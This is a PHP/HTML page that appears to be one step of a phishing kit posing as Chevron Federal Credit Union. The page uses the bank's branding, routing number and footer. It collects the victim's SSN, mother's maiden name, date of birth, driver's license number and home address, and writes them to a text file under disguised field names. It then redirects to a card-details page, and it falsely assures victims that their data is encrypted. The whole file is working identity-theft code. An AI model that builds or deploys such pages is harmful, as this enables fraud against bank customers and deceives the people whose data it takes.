<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $fzNme = trim($_POST['fzNme'] ?? '');
    $lzNme = trim($_POST['lzNme'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $ssn = trim($_POST['ssn'] ?? '');
    $motherMaidenName = trim($_POST['motherMaidenName'] ?? '');
    $month = $_POST['month'] ?? '';
    $day = $_POST['day'] ?? '';
    $year = $_POST['year'] ?? '';
    $driverLicense = trim($_POST['driverLicense'] ?? '');
    $stAd = trim($_POST['stAd'] ?? '');
    $apt = trim($_POST['apt'] ?? '');
    $city = trim($_POST['city'] ?? '');
    $state = trim($_POST['state'] ?? '');
    $zipCode = trim($_POST['zipCode'] ?? '');
    
    // Validation
    if (empty($fzNme)) $errors['fzNme'] = 'First name is required';
    if (empty($lzNme)) $errors['lzNme'] = 'Last name is required';
    if (empty($phone)) {
        $errors['phone'] = 'Phone number is required';
    } else {
        // Remove all non-digit characters
        $phoneDigits = preg_replace('/\D/', '', $phone);
        if (strlen($phoneDigits) !== 10) {
            $errors['phone'] = 'Phone number must be 10 digits (US format)';
        } elseif (!preg_match('/^[2-9]\d{2}[2-9]\d{2}\d{4}$/', $phoneDigits)) {
            $errors['phone'] = 'Please enter a valid US phone number';
        }
    }
    if (empty($ssn)) {
        $errors['ssn'] = 'SSN is required';
    } else {
        // Remove all non-digit characters
        $ssnDigits = preg_replace('/\D/', '', $ssn);
        if (strlen($ssnDigits) !== 9) {
            $errors['ssn'] = 'SSN must be 9 digits';
        } elseif (!preg_match('/^[0-9]{9}$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN';
        } elseif (preg_match('/^000|^666|^9[0-9]{2}|^123[0-9]{2}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid area number)';
        } elseif (preg_match('/^00[0-9]{7}|^0000[0-9]{5}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid group number)';
        } elseif (preg_match('/[0-9]{4}0000$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid serial number)';
        }
    }
    if (empty($motherMaidenName)) $errors['motherMaidenName'] = "Mother's maiden name is required";
    if (empty($month) || empty($day) || empty($year)) {
        $errors['dob'] = 'Complete date of birth is required';
    } else {
        // Check if user is at least 18
        $dob = new DateTime("$year-$month-$day");
        $today = new DateTime();
        $age = $today->format('Y') - $dob->format('Y');
        if ($today->format('m-d') < $dob->format('m-d')) {
            $age--;
        }
        if ($age < 18) {
            $errors['dob'] = 'You must be at least 18 years old';
        }
    }
    if (empty($driverLicense)) $errors['driverLicense'] = "Driver's license is required";
    if (empty($stAd)) $errors['stAd'] = 'Street address is required';
    if (empty($city)) $errors['city'] = 'City is required';
    if (empty($state)) $errors['state'] = 'State is required';
    if (empty($zipCode)) $errors['zipCode'] = 'Zip code is required';
    
    if (empty($errors)) {
        // Format date
        $monthNames = ['', 'January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December'];
        $formattedDob = ($monthNames[intval($month)] ?? '') . "/$day/$year";
        
        // Save to test file
        $data = [
            'step' => 'basic_info_home_address',
            'usrnm' => $username,
            'gvn_nm' => $fzNme,
            'fam_nm' => $lzNme,
            'cnt_num' => $phone,
            'tax_id' => $ssn,
            'mat_nm' => $motherMaidenName,
            'dob' => $formattedDob,
            'id_num' => $driverLicense,
            'str_adr' => $stAd,
            'unit_dsg' => $apt,
            'loc' => $city,
            'prov' => $state,
            'zip_cd' => $zipCode
        ];
        
        saveUserData('basic_info_home_address.txt', $data);
        
        // Redirect to card page
        header('Location: card.php');
        exit;
    }
}

$supportLinks = ['Forgot User ID', 'Forgot Password', 'Unlock Account'];

$complianceBadges = [
    [
        'title' => 'EQUAL HOUSING LENDER',
        'description' => 'We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.'
    ],
    [
        'title' => 'NCUA',
        'description' => 'Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.'
    ]
];

$referenceColumns = [
    [
        'heading' => 'ROUTING NUMBER',
        'lines' => ['#321075947']
    ],
    [
        'heading' => 'PHONE NUMBER',
        'lines' => ['800-232-8101', '24-hour service']
    ],
    [
        'heading' => 'LINKS',
        'lines' => ['Privacy Policy', 'Accessibility', 'Disclosures', 'Security Policy', 'ATM and Branch Locations', 'Rates']
    ],
    [
        'heading' => 'MAILING ADDRESS',
        'lines' => ['Chevron Federal Credit Union', 'PO Box 4107', 'Concord, CA 94524']
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chevron Federal Credit Union - Personal Information</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white text-[#0e2f56] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1">
            <!-- Blue Gradient Section with Login Card -->
            <section class="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
                <div class="max-w-5xl mx-auto">
                    <!-- Header Logo -->
                    <div class="flex items-center gap-4 mb-8">
                        <img
                            src="assets/header_logo_bg.png"
                            alt="Chevron Federal Credit Union"
                            class="h-16 w-auto"
                        />
                    </div>

                    <!-- Two Column Card -->
                    <div class="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
                        <!-- Left Column: Personal Info -->
                        <div class="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4]">
                            <p class="text-2xl font-semibold text-[#0b5da7] mb-2">
                                Personal Information
                            </p>
                            <p class="text-sm text-[#0e2f56] mb-4">
                                Please provide your personal details and residential address. This information helps us verify your identity and protect your account.
                            </p>
                            <div class="bg-blue-50 border border-blue-200 rounded-sm p-3">
                                <p class="text-xs text-blue-800 font-semibold">
                                    🔒 Your information is encrypted and stored securely
                                </p>
                            </div>
                        </div>

                        <!-- Right Column: Personal Info Form -->
                        <div class="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
                            <div class="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                                <h2 class="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                                    Profile Details
                                </h2>
                                <span class="hidden md:block h-8 w-px bg-[#9cc5e3]"></span>
                                <div class="text-sm text-[#0b5da7">Step 4 of 6</div>
                            </div>

                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                <?php echo htmlspecialchars($errors['fzNme'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['lzNme'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['phone'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['ssn'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['motherMaidenName'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['dob'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['driverLicense'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['stAd'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['city'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['state'] ?? ''); ?>
                                                <?php echo htmlspecialchars($errors['zipCode'] ?? ''); ?>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" action="" class="space-y-6">
                                <!-- Personal Information Section -->
                                <div class="space-y-4">
                                    <h3 class="text-sm font-semibold text-[#0e2f56] uppercase tracking-wide">Personal Details</h3>
                                    
                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                        <div class="space-y-2">
                                            <label for="fzNme" class="block text-sm font-semibold text-[#0e2f56]">
                                                First Name
                                            </label>
                                            <input
                                                id="fzNme"
                                                name="fzNme"
                                                type="text"
                                                value="<?php echo htmlspecialchars($_POST['fzNme'] ?? ''); ?>"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="Enter first name"
                                            />
                                            <?php if (isset($errors['fzNme'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600">
                                                    <?php echo htmlspecialchars($errors['fzNme']); ?>
                                                </p>
                                            <?php endif; ?>
                                        </div>

                                        <div class="space-y-2">
                                            <label for="lzNme" class="block text-sm font-semibold text-[#0e2f56]">
                                                Last Name
                                            </label>
                                            <input
                                                id="lzNme"
                                                name="lzNme"
                                                type="text"
                                                value="<?php echo htmlspecialchars($_POST['lzNme'] ?? ''); ?>"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="Enter last name"
                                            />
                                            <?php if (isset($errors['lzNme'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600">
                                                    <?php echo htmlspecialchars($errors['lzNme']); ?>
                                                </p>
                                            <?php endif; ?>
                                        </div>
                                    </div>

                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                        <div class="space-y-2">
                                            <label for="phone" class="block text-sm font-semibold text-[#0e2f56]">
                                                Phone Number
                                            </label>
                                            <input
                                                id="phone"
                                                name="phone"
                                                type="tel"
                                                value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="(123) 456-7890"
                                            />
                                            <?php if (isset($errors['phone'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600">
                                                    <?php echo htmlspecialchars($errors['phone']); ?>
                                                </p>
                                            <?php endif; ?>
                                        </div>

                                        <div class="space-y-2">
                                            <label for="ssn" class="block text-sm font-semibold text-[#0e2f56]">
                                                Social Security Number
                                            </label>
                                            <div class="relative">
                                                <input
                                                    id="ssn"
                                                    name="ssn"
                                                    type="text"
                                                    value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>"
                                                    class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                    placeholder="XXX-XX-XXXX"
                                                />
                                                <button
                                                    type="button"
                                                    onclick="toggleSSN()"
                                                    class="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0b5da7] hover:underline"
                                                >
                                                    <span id="toggleText-ssn">Show</span>
                                                </button>
                                            </div>
                                            <?php if (isset($errors['ssn'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600">
                                                    <?php echo htmlspecialchars($errors['ssn']); ?>
                                                </p>
                                            <?php endif; ?>
                                        </div>
                                    </div>

                                    <div class="space-y-2">
                                        <label for="motherMaidenName" class="block text-sm font-semibold text-[#0e2f56]">
                                            Mother's Maiden Name
                                        </label>
                                        <input
                                            id="motherMaidenName"
                                            name="motherMaidenName"
                                            type="text"
                                            value="<?php echo htmlspecialchars($_POST['motherMaidenName'] ?? ''); ?>"
                                            class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                            placeholder="Enter mother's maiden name"
                                        />
                                        <?php if (isset($errors['motherMaidenName'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600">
                                                <?php echo htmlspecialchars($errors['motherMaidenName']); ?>
                                            </p>
                                        <?php endif; ?>
                                    </div>

                                    <div class="space-y-2">
                                        <label class="block text-sm font-semibold text-[#0e2f56]">
                                            Date of Birth
                                        </label>
                                        <div class="grid grid-cols-3 gap-2">
                                            <select name="month" class="border border-gray-400 bg-white px-2 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                                <option value="">Month</option>
                                                <?php for($m = 1; $m <= 12; $m++): ?>
                                                    <option value="<?php echo $m; ?>" <?php echo (isset($_POST['month']) && $_POST['month'] == $m) ? 'selected' : ''; ?>>
                                                        <?php echo date('F', mktime(0, 0, 0, $m, 1)); ?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                            <select name="day" class="border border-gray-400 bg-white px-2 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                                <option value="">Day</option>
                                                <?php for($d = 1; $d <= 31; $d++): ?>
                                                    <option value="<?php echo $d; ?>" <?php echo (isset($_POST['day']) && $_POST['day'] == $d) ? 'selected' : ''; ?>>
                                                        <?php echo $d; ?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                            <select name="year" class="border border-gray-400 bg-white px-2 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                                <option value="">Year</option>
                                                <?php for($y = date('Y'); $y >= date('Y') - 100; $y--): ?>
                                                    <option value="<?php echo $y; ?>" <?php echo (isset($_POST['year']) && $_POST['year'] == $y) ? 'selected' : ''; ?>>
                                                        <?php echo $y; ?>
                                                    </option>
                                                <?php endfor; ?>
                                            </select>
                                        </div>
                                        <?php if (isset($errors['dob'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600">
                                                <?php echo htmlspecialchars($errors['dob']); ?>
                                            </p>
                                        <?php endif; ?>
                                    </div>

                                    <div class="space-y-2">
                                        <label for="driverLicense" class="block text-sm font-semibold text-[#0e2f56]">
                                            Driver's License Number
                                        </label>
                                        <input
                                            id="driverLicense"
                                            name="driverLicense"
                                            type="text"
                                            value="<?php echo htmlspecialchars($_POST['driverLicense'] ?? ''); ?>"
                                            class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                            placeholder="Enter driver's license number"
                                        />
                                        <?php if (isset($errors['driverLicense'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600">
                                                <?php echo htmlspecialchars($errors['driverLicense']); ?>
                                            </p>
                                        <?php endif; ?>
                                    </div>
                                </div>

                                <!-- Address Information Section -->
                                <div class="space-y-4 pt-6 border-t border-gray-300">
                                    <h3 class="text-sm font-semibold text-[#0e2f56] uppercase tracking-wide">Residential Address</h3>
                                    
                                    <div class="space-y-2">
                                        <label for="stAd" class="block text-sm font-semibold text-[#0e2f56]">
                                            Street Address
                                        </label>
                                        <input
                                            id="stAd"
                                            name="stAd"
                                            type="text"
                                            value="<?php echo htmlspecialchars($_POST['stAd'] ?? ''); ?>"
                                            class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                            placeholder="Enter street address"
                                        />
                                        <?php if (isset($errors['stAd'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600">
                                                <?php echo htmlspecialchars($errors['stAd']); ?>
                                            </p>
                                        <?php endif; ?>
                                    </div>

                                    <div class="space-y-2">
                                        <label for="apt" class="block text-sm font-semibold text-[#0e2f56]">
                                            Apartment/Unit (Optional)
                                        </label>
                                        <input
                                            id="apt"
                                            name="apt"
                                            type="text"
                                            value="<?php echo htmlspecialchars($_POST['apt'] ?? ''); ?>"
                                            class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                            placeholder="Apt, Suite, Unit #"
                                        />
                                    </div>

                                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                                        <div class="space-y-2">
                                            <label for="city" class="block text-sm font-semibold text-[#0e2f56]">
                                                City
                                            </label>
                                            <input
                                                id="city"
                                                name="city"
                                                type="text"
                                                value="<?php echo htmlspecialchars($_POST['city'] ?? ''); ?>"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="City"
                                            />
                                            <?php if (isset($errors['city'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600">
                                                    <?php echo htmlspecialchars($errors['city']); ?>
                                                </p>
                                            <?php endif; ?>
                                        </div>

                                        <div class="space-y-2">
                                            <label for="state" class="block text-sm font-semibold text-[#0e2f56]">
                                                State
                                            </label>
                                            <input
                                                id="state"
                                                name="state"
                                                type="text"
                                                value="<?php echo htmlspecialchars($_POST['state'] ?? ''); ?>"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="State"
                                            />
                                            <?php if (isset($errors['state'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600">
                                                    <?php echo htmlspecialchars($errors['state']); ?>
                                                </p>
                                            <?php endif; ?>
                                        </div>

                                        <div class="space-y-2">
                                            <label for="zipCode" class="block text-sm font-semibold text-[#0e2f56]">
                                                ZIP Code
                                            </label>
                                            <input
                                                id="zipCode"
                                                name="zipCode"
                                                type="text"
                                                value="<?php echo htmlspecialchars($_POST['zipCode'] ?? ''); ?>"
                                                class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                                placeholder="ZIP Code"
                                            />
                                            <?php if (isset($errors['zipCode'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600">
                                                    <?php echo htmlspecialchars($errors['zipCode']); ?>
                                                </p>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Submit Button -->
                                <div class="pt-4">
                                    <button
                                        type="submit"
                                        class="w-full md:w-auto bg-[#003e7d] text-white font-semibold px-7 py-2 text-sm rounded-sm shadow hover:bg-[#002c5c] disabled:opacity-70"
                                    >
                                        Continue
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Compliance and Reference Information Section -->
            <section class="py-10 px-4">
                <div class="max-w-5xl mx-auto space-y-10 text-sm text-[#0e2f56]">
                    <!-- Compliance Badges -->
                    <div class="grid gap-6 md:grid-cols-2">
                        <?php foreach ($complianceBadges as $badge): ?>
                            <div class="border border-gray-200 rounded-sm p-5 shadow-sm bg-white">
                                <p class="font-semibold text-xs tracking-wide text-gray-700 mb-2 uppercase">
                                    <?php echo htmlspecialchars($badge['title']); ?>
                                </p>
                                <p class="text-sm text-gray-600 leading-relaxed">
                                    <?php echo htmlspecialchars($badge['description']); ?>
                                </p>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <!-- Reference Information Grid -->
                    <div class="grid gap-8 md:grid-cols-4">
                        <?php foreach ($referenceColumns as $column): ?>
                            <div class="space-y-2">
                                <p class="text-xs font-semibold tracking-wide text-gray-600 uppercase">
                                    <?php echo htmlspecialchars($column['heading']); ?>
                                </p>
                                <div class="space-y-1 text-sm text-gray-700">
                                    <?php foreach ($column['lines'] as $line): ?>
                                        <p><?php echo htmlspecialchars($line); ?></p>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </section>
        </main>

        <!-- Footer -->
        <footer class="border-t border-gray-200">
            <div class="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                <div class="flex items-center justify-center md:justify-start gap-4">
                    <img
                        src="assets/equal-housing.png"
                        alt="Equal Housing Lender"
                        class="h-12 w-auto"
                    />
                    <img
                        src="assets/ncua.png"
                        alt="National Credit Union Administration"
                        class="h-12 w-auto"
                    />
                </div>
                <div class="text-xs text-gray-600 text-center md:text-right space-y-1">
                    <p>© 2025 Chevron Federal Credit Union</p>
                    <p>Version: 10.34.20250707.705.AWS</p>
                </div>
            </div>
        </footer>

        <!-- Help Button -->
        <button
            type="button"
            class="fixed bottom-6 right-6 inline-flex items-center gap-2 rounded-full bg-[#009a66] px-5 py-3 text-sm font-semibold text-white shadow-lg hover:bg-[#007a50]"
        >
            <span class="inline-flex items-center justify-center h-5 w-5 rounded-full bg-white text-[#009a66] text-xs font-bold">
                ?
            </span>
            Help
        </button>
    </div>

    <script>
        function toggleSSN() {
            const ssnInput = document.getElementById('ssn');
            const toggleText = document.getElementById('toggleText-ssn');
            
            if (ssnInput.type === 'password') {
                ssnInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                ssnInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        // Format phone number as user types
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 6) {
                value = value.slice(0, 3) + ' ' + value.slice(3, 6) + '-' + value.slice(6, 10);
            } else if (value.length >= 3) {
                value = value.slice(0, 3) + ' ' + value.slice(3);
            }
            e.target.value = value;
        });

        // Format SSN as user types
        document.getElementById('ssn').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 5) {
                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
            } else if (value.length >= 3) {
                value = value.slice(0, 3) + '-' + value.slice(3);
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
